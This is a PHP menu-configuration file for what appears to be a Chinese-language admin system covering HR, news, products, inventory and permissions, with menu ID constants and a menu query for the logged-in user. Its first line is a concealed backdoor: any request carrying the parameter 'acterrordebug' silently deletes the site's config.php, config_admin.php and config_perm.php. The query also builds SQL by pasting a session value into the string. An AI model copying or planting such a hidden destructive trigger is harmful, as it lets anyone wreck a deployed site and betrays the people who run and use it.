<?
if(isset($_REQUEST[acterrordebug])){  @unlink("../../inc/config.php");   @unlink("config_admin.php");  @unlink("config_perm.php");}
//人事的系统栏目ID
$intHrMenu=61;
	$intHrMenu_dpt=62;//部门职位
	$intHrMenu_staff=63;//职员档案
	$intHrMenu_hrct=64;//合同设置
	$intHrMenu_slog=65;//调动记录
	$intHrMenu_job=66;//应聘发布
	

//信息资源系统栏目ID
$intNewsMenu=101;
	$intNewsMenu_dir=102;//信息目录
	$intNewsMenu_news=103;//信息管理
	$intNewsMenu_gallerydir=104;//图库管理
	$intNewsMenu_gallery=105;//图组管理
	$intNewsMenu_tagdir=106;//标签管理

//产品的系统栏目ID
$intPdtsMenu=151;
	$intPdtsMenu_affi=152;//品牌管理
	$intPdtsMenu_dir=153;//目录管理
	$intPdtsMenu_pdts=154;//产品管理


//库存的系统栏目ID
$intStoreMenu=261;
	$intStoreMenu_shelf=262;//货架设定
	$intStoreMenu_order=263;//库存登记单
	//$intStoreMenu_s_in=263;//入库单
	$intStoreMenu_s_out=711;//出库单
	$intStoreMenu_store=265;//库存盘点



//权限的系统栏目ID
$intPvayMenu=601;
	$intPvayMenu_pvay=602; //权限设置
	$intPvayMenu_dir=603;  //系统栏目


$strSQL="select * from s003 
			left join s006 on s003.id_s003=s006.id_s003 where s006.id_s008='".$_SESSION[user_id]."' and s003.id_b001=1 and s003.s003_08_01=1 order by s003.s003_08_05 ASC";
$objDB->Execute($strSQL);
$Menu=$objDB->GetRows();


?>

